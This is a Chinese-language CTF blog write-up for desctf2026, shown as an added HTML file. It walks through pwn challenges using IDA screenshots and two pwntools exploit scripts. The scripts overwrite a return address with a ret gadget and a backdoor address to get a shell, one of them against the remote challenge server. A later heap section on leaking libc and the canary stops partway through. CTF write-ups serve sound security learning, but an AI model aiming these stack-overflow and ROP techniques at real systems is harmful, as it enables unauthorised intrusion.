@@ -1,0 +1,1148 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shark">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="array  非常友好啊   行，看看ida       看着像stack overflow     ida 太好用了你知道吗   还有这好事     本地过了 1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *#io &#x3D; remote(&quot;129.211.17">
+<meta property="og:type" content="article">
+<meta property="og:title" content="desctf2026">
+<meta property="og:url" content="https://ghostshark-pro.github.io/2026/03/20/desctf2026/index.html">
+<meta property="og:site_name" content="shark&#39;s home">
+<meta property="og:description" content="array  非常友好啊   行，看看ida       看着像stack overflow     ida 太好用了你知道吗   还有这好事     本地过了 1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *#io &#x3D; remote(&quot;129.211.17">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772934765460-548316fb-62fa-4d1b-bfd1-b90525a315fc.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772934007681-ade551b3-92cb-453d-84d0-d6c01d5c1df0.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772934038962-7e03dc62-62ec-42d9-bc9e-dac4db315185.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772934057638-3b6dba21-2370-42a5-9235-7e7eb5d68da0.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772934074440-76cd6fe8-3cb3-4995-a733-a883e08b4a56.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772934184565-1ae57b73-78b9-47ed-88a9-5a3e079029af.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772934220977-d0f056f1-3679-4853-a2f4-ba79ab968854.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772934428787-9ae5d693-4faf-4b7b-b0f6-5c39670d415c.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772935534229-f600023d-16d5-4109-924f-3fe650fed95c.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772935687127-69206751-0ebe-4dd5-b4ea-7cdf3ae4483b.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772935709082-45c0dfee-17ce-495a-8a57-d16a05811c68.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772936026497-a1d19387-166d-468c-8632-a2a9b03d4565.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772937309467-6d9f88cc-1f61-47e9-a8bb-1c227919868b.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772941887326-3ef537c1-cd3a-4de2-8d0e-c8aa6a440372.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772937768356-7ad092f6-e35d-40eb-84f1-50ccccdc3302.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772938020378-df91a851-f653-48a9-b541-ff6732b673ee.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772938080663-298cf8bf-f68b-4547-85b0-74a7eaafaed1.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772938141329-172e783d-f07a-4b74-af11-5c251ea94c96.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772947143329-0f77e36d-b5c5-4820-a255-1bee963df079.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772943040328-6b596b4f-2f6e-4e4c-a705-fb6387d2256b.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772943024793-1de1f9bf-ea06-42f5-b9c8-e848855761bd.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772943726444-ed618c0f-408b-4621-8a51-8293d7cdc06f.jpeg">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772938413813-e17cf8c2-9082-4bd3-9df7-a9a1e3c97225.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772939621212-bebcd87e-0ccd-4d7e-aeb2-53dc9990a537.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772947661098-404754b5-1ed0-4417-9490-9b9ae60c7d01.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772947916623-6f97952e-9a38-4990-accd-81e1316d3041.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772947974091-be15c352-4070-4787-ac2a-74ffa8061361.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772948118034-c8f8eea7-3df7-4198-9099-364815cdff6b.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772948383656-6365c061-e822-4147-89bc-134393dd05f0.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772951348280-43c54623-da8f-4b47-ac99-8223fca5775a.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772952167575-246a732c-3d29-4945-9bb1-557188813e3f.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772952963684-8b26663e-1635-41df-a618-7d211b9843a5.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772953010054-a9d8b2d6-0bc3-457c-ac3e-7df803b32239.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772953451207-7b0c20de-7ff0-4753-9ba1-a73253d3642b.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772953508834-965cc05d-c87d-40a4-987d-8f840385d3ea.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772956554090-88f50114-6a3d-4c53-8d01-519447eb9257.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772956858238-e30cf527-ed7c-4837-aa0f-87d972638a28.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772957350438-a27a2826-1eb6-4c8b-aac3-e9da93949ac5.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772959392766-fb8bd91f-ca56-4632-a29d-348830e0afd6.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772961651707-82f95a9d-8ef8-40eb-8f96-2783390808bf.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772972578805-dc0b1956-f8df-4306-8f82-4dc73c09008a.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772983330705-a285826d-97f4-48b1-9f4f-04a960fb2392.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772988611685-c7673228-1dd0-4e95-88ed-29adf460ed2a.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772989962563-227dd733-a819-444e-970a-23f37dab7ab3.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772990030362-cc178780-14b3-4d00-b7a2-9aebe96b50e8.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772990045169-df673094-7db2-4c1a-882c-3d1446cbfd6e.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1773053630913-5efa3601-73eb-4eef-8949-7612413deb65.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1773053823595-6a922668-284f-4dee-abb2-e2514b216347.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/desctf2026/1773057162291-88100eb2-b768-4d24-9451-6dc1620b5901.png">
+<meta property="article:published_time" content="2026-03-20T12:51:36.000Z">
+<meta property="article:modified_time" content="2026-04-23T13:22:41.026Z">
+<meta property="article:author" content="shark">
+<meta property="article:tag" content="-index">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="canary_leak">
+<meta property="article:tag" content="rop">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ghostshark-pro.github.io/images/desctf2026/1772934765460-548316fb-62fa-4d1b-bfd1-b90525a315fc.png">
+  
+  
+  
+  <title>desctf2026 - shark&#39;s home</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ghostshark-pro.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#00FFFF","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>shark&#39;s home</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Terminal</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Arsenal</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Timeline</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Friends</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>Whoami</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>Terminal</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>Arsenal</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>Tags</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>Timeline</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/links/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-link-fill"></i>
+                  <span>Friends</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>Whoami</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>Grep</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="Light Mode"
+               data-label-dark="Dark Mode">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">Dark Mode</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/bg.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="desctf2026"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-03-20 20:51" pubdate>
+          2026年3月20日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.7k bytes
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          ETA: 56 min
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">desctf2026</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="array"><a href="#array" class="headerlink" title="array"></a>array</h1><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772934765460-548316fb-62fa-4d1b-bfd1-b90525a315fc.png" srcset="/img/loading.gif" lazyload></p>
+<p>非常友好啊</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772934007681-ade551b3-92cb-453d-84d0-d6c01d5c1df0.png" srcset="/img/loading.gif" lazyload></p>
+<p>行，看看ida</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772934038962-7e03dc62-62ec-42d9-bc9e-dac4db315185.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772934057638-3b6dba21-2370-42a5-9235-7e7eb5d68da0.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772934074440-76cd6fe8-3cb3-4995-a733-a883e08b4a56.png" srcset="/img/loading.gif" lazyload></p>
+<p>看着像stack overflow</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772934184565-1ae57b73-78b9-47ed-88a9-5a3e079029af.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772934220977-d0f056f1-3679-4853-a2f4-ba79ab968854.png" srcset="/img/loading.gif" lazyload></p>
+<p>ida 太好用了你知道吗</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772934428787-9ae5d693-4faf-4b7b-b0f6-5c39670d415c.png" srcset="/img/loading.gif" lazyload></p>
+<p>还有这好事</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772935534229-f600023d-16d5-4109-924f-3fe650fed95c.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772935687127-69206751-0ebe-4dd5-b4ea-7cdf3ae4483b.png" srcset="/img/loading.gif" lazyload></p>
+<p>本地过了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>#io = remote(&quot;129.211.172.20&quot;,31362)<br>io = process(&#x27;./array&#x27;)<br><br>backdoor = 0x401339<br>ret_gadget = 0x40101a<br><br>def bypass_rand(idx, value):<br>    while True:<br>        io.send(b&#x27;A\n&#x27;) <br>        io.send(p64(idx))<br>        try:<br>            msg = io.recv(timeout=0.5)<br>            if b&quot;No!&quot; in msg:<br>                continue<br>            if b&quot;number2&quot; in msg:<br>                io.send(p64(value))<br>                log.success(f&quot;Success! Overwrote idx &#123;idx&#125; with &#123;hex(value)&#125;&quot;)<br>                return<br>        except EOFError:<br>            exit()<br><br>io.sendafter(b&quot;number1:&quot;, p64(17))<br><br># 2. 修改 buf_ (idx 16)<br>bypass_rand(16, 100)<br><br># 3. 覆盖 RBP (idx 21)<br># 4. 覆盖返回地址 (idx 22) -&gt; 填入 ret 指令地址（用于对齐）<br>log.info(&quot; ret gadget&quot;)<br>bypass_rand(22, ret_gadget)<br><br># 5. 覆盖返回地址之后的内存 (idx 23) ,填入 backdoor 地址<br># v2[idx+1]，所以 idx 23 对应 v2[24]，即返回地址之后的位置<br>log.info(&quot;backdoor address&quot;)<br>bypass_rand(23, backdoor)<br><br>log.info(&quot;Sending &#x27;D&#x27; &quot;)<br>io.send(b&#x27;D&#x27;) <br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772935709082-45c0dfee-17ce-495a-8a57-d16a05811c68.png" srcset="/img/loading.gif" lazyload></p>
+<p>远程不行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br><br># io = process(&#x27;./array&#x27;)<br>io = remote(&#x27;129.211.172.20&#x27;, 31362)<br><br>backdoor = 0x401339<br>ret_gadget = 0x40101a<br><br>def send_payload(idx, value, name):<br><br>    while True:<br>        # no &#x27;D&#x27;<br>        io.send(b&#x27;A&#x27;)<br>        io.send(b&#x27;B&#x27;)<br>        # send index<br>        io.send(p64(idx))<br>        <br>        # utilize recvuntil,adviod to dead<br>        res = io.recvuntil((b&quot;No!\n&quot;, b&quot;number2:\n&quot;))<br>        <br>        if b&quot;number2&quot; in res:<br>            # if pass , send value<br>            io.send(p64(value))<br>            log.success(f&quot;Successfully  &#123;name&#125;!&quot;)<br>            return<br>        else:<br>            continue<br>io.sendafter(b&quot;number1:&quot;, p64(17))<br>send_payload(16, 100, &quot;buf_&quot;)<br>send_payload(22, ret_gadget, &quot;ret gadget&quot;)<br>send_payload(23, backdoor, &quot;backdoor&quot;)<br>log.info(&quot;Sending &#x27;D&#x27; &quot;)<br>io.send(b&#x27;D&#x27;)<br><br># Get Shell<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772936026497-a1d19387-166d-468c-8632-a2a9b03d4565.png" srcset="/img/loading.gif" lazyload></p>
+<p>ok</p>
+<h1 id="chall"><a href="#chall" class="headerlink" title="chall"></a>chall</h1><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772937309467-6d9f88cc-1f61-47e9-a8bb-1c227919868b.png" srcset="/img/loading.gif" lazyload></p>
+<p>我去，heap</p>
+<p>看看libc</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772941887326-3ef537c1-cd3a-4de2-8d0e-c8aa6a440372.png" srcset="/img/loading.gif" lazyload></p>
+<p>2.35</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772937768356-7ad092f6-e35d-40eb-84f1-50ccccdc3302.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护开的挺全</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772938020378-df91a851-f653-48a9-b541-ff6732b673ee.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772938080663-298cf8bf-f68b-4547-85b0-74a7eaafaed1.png" srcset="/img/loading.gif" lazyload></p>
+<p>输入原始 Token (rand后的)</p>
+<p>变成admin</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772938141329-172e783d-f07a-4b74-af11-5c251ea94c96.png" srcset="/img/loading.gif" lazyload></p>
+<p>user 没有权限</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772947143329-0f77e36d-b5c5-4820-a255-1bee963df079.png" srcset="/img/loading.gif" lazyload></p>
+<p>原来是输入数字</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772943040328-6b596b4f-2f6e-4e4c-a705-fb6387d2256b.png" srcset="/img/loading.gif" lazyload></p>
+<p>wow， debug</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772943024793-1de1f9bf-ea06-42f5-b9c8-e848855761bd.png" srcset="/img/loading.gif" lazyload></p>
+<p> Stack Buffer Overflow  ！！！</p>
+<p>卧槽，这是rop</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772943726444-ed618c0f-408b-4621-8a51-8293d7cdc06f.jpeg" srcset="/img/loading.gif" lazyload></p>
+<p><font style="color:#DF2A3F;">思路有了，先进入admin_mode，然后用debug，debug可以stack overflow,题目给了libc，后面在加个rop</font></p>
+<p><font style="color:#DF2A3F;">我去</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772938413813-e17cf8c2-9082-4bd3-9df7-a9a1e3c97225.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们看看byte_5020 和a3的value</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772939621212-bebcd87e-0ccd-4d7e-aeb2-53dc9990a537.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772947661098-404754b5-1ed0-4417-9490-9b9ae60c7d01.png" srcset="/img/loading.gif" lazyload></p>
+<p>ok,进到admin了</p>
+<p>找libc的offset</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772947916623-6f97952e-9a38-4990-accd-81e1316d3041.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772947974091-be15c352-4070-4787-ac2a-74ffa8061361.png" srcset="/img/loading.gif" lazyload></p>
+<p>libc_base</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772948118034-c8f8eea7-3df7-4198-9099-364815cdff6b.png" srcset="/img/loading.gif" lazyload></p>
+<p> Thread Local Storage  </p>
+<p>canary</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772948383656-6365c061-e822-4147-89bc-134393dd05f0.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772951348280-43c54623-da8f-4b47-ac99-8223fca5775a.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772952167575-246a732c-3d29-4945-9bb1-557188813e3f.png" srcset="/img/loading.gif" lazyload></p>
+<p> 输入的前 8 个字节当作指针，并把该地址清零  </p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772952963684-8b26663e-1635-41df-a618-7d211b9843a5.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们看看master_canary_addr对不对</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772953010054-a9d8b2d6-0bc3-457c-ac3e-7df803b32239.png" srcset="/img/loading.gif" lazyload></p>
+<p>太好了</p>
+<!-- 这是一张图片，ocr 内容为： -->
